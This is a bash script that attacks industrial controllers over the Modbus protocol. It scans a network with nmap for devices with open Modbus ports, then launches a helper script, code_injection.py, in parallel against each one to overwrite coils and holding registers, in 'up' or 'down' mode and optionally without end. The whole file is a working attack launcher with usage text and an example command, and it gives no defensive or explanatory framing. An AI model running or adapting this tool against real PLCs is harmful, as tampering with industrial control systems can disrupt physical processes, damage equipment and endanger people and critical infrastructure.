#!/bin/bash

# Function to handle the termination signal (Ctrl+C)
cleanup() {
    echo "Stopping all attacks..."
    # Kill all background jobs (in this case, the attacks)
    kill $(jobs -p)
    wait
    echo "All attacks have been stopped."
    exit 0
}

# Set trap to call cleanup function on SIGINT (Ctrl+C)
trap cleanup SIGINT

# Display help information
show_help() {
    echo "Usage: $0 [OPTIONS]"
    echo "Launch coordinated Modbus attacks against multiple PLCs in a network."
    echo ""
    echo "Required options:"
    echo "  -n, --network NETWORK   Network address with CIDR notation (e.g., 192.168.60.0/24)"
    echo "  -m, --mode MODE         Attack mode (up/down)"
    echo ""
    echo "Optional options:"
    echo "  -p, --port PORT         Target Modbus port (default: 502)"
    echo "  -c, --coils NUM         Number of coils to manipulate (default: 100)"
    echo "  -r, --registers NUM     Number of holding registers to manipulate (default: 100)"
    echo "  -v, --value VALUE       Value to write to holding registers (default: 0)"
    echo "  -t, --time SECONDS      Attack duration in seconds (default: 0 - infinite)"
    echo "  -h, --help              Show this help message"
    echo ""
    echo "Example:"
    echo "  $0 -n 192.168.60.0/24 -m down -p 5020 -c 200 -r 50 -v 42 -t 60"
    exit 0
}

# Parse command-line arguments
while [[ "$#" -gt 0 ]]; do
    case $1 in
        -n|--network) network_address="$2"; shift ;;
        -m|--mode) attack_mode="$2"; shift ;;
        -p|--port) attack_port="$2"; shift ;;
        -c|--coils) n_coils="$2"; shift ;;
        -r|--registers) n_holding_registers="$2"; shift ;;
        -v|--value) hr_value="$2"; shift ;;
        -t|--time) attack_time="$2"; shift ;;
        -h|--help) show_help ;;
        *) echo "Unknown parameter passed: $1"; exit 1 ;;
    esac
    shift
done

# Validate required parameters
if [[ -z "$network_address" || -z "$attack_mode" ]]; then
    echo "Error: Missing required parameters!"
    echo ""
    show_help
fi

# Set default values for optional parameters
attack_port=${attack_port:-502}
n_coils=${n_coils:-100}
n_holding_registers=${n_holding_registers:-100}
hr_value=${hr_value:-0}
attack_time=${attack_time:-0}

# Extract network prefix from network address
network_prefix=$(echo $network_address | cut -d'.' -f1-3)

# Find Modbus PLC IP addresses
echo "Scanning network for Modbus devices..."
plc_ips=$(nmap -p $attack_port --open $network_address | grep -oP "$network_prefix\.\d+")

if [[ -z "$plc_ips" ]]; then
    echo "No Modbus devices found on port $attack_port in network $network_address"
    exit 1
fi

# Launch attacks in parallel
echo "Starting attacks on ${attack_mode} mode..."
for ip in $plc_ips; do
    python3 code_injection.py --ip $ip \
        --port $attack_port \
        --mode $attack_mode \
        --n_coils $n_coils \
        --n_holding_registers $n_holding_registers \
        --hr_value $hr_value \
        --time $attack_time &
done

# Wait for all background processes
wait